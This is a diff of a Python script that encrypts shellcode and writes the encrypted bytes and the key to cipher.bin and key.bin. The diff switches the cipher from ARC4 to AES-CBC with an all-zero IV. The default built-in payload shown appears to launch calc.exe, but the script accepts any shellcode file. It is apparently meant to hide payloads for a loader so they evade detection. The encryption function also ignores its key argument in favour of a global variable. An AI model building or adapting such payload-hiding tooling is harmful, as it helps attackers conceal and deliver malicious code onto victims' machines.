@@ -1,14 +1,17 @@
 import os
 import random
-from arc4 import ARC4
 import argparse
+import sys
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from os import urandom
+import hashlib
 
 parser = argparse.ArgumentParser(description='Generate encrypted shellcode and key files.')
 parser.add_argument('--shellcode', type=str, help='Path to the shellcode file', required=False)
 args = parser.parse_args()
 
 
-key = ""
 buf = b""
 
 if args.shellcode:
@@ -42,17 +45,21 @@ else:
     buf += b"\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x63"
     buf += b"\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
-def generate_random_key():
-    global key
-    key=random.randbytes(16)
+def AESencrypt(plaintext, key):
+    k = hashlib.sha256(KEY).digest()
+    iv = 16 * b'\x00'
+    plaintext = pad(plaintext, AES.block_size)
+    cipher = AES.new(k, AES.MODE_CBC, iv)
+    ciphertext = cipher.encrypt(plaintext)
+    return ciphertext,key
+  
+def dropFile(key, ciphertext):
+  with open("cipher.bin", "wb") as fc:
+    fc.write(ciphertext)
+  with open("key.bin", "wb") as fk:
+    fk.write(key)
 
-generate_random_key()
+KEY = urandom(16)
+ciphertext, key = AESencrypt(buf, KEY)
 
-arc4 = ARC4(key)
-cipher = arc4.encrypt(buf)
-
-with open('cipher.bin','wb')as file:
-    file.write(cipher)
-
-with open('key.bin','wb')as file:
-    file.write(key)
+dropFile(KEY,ciphertext)
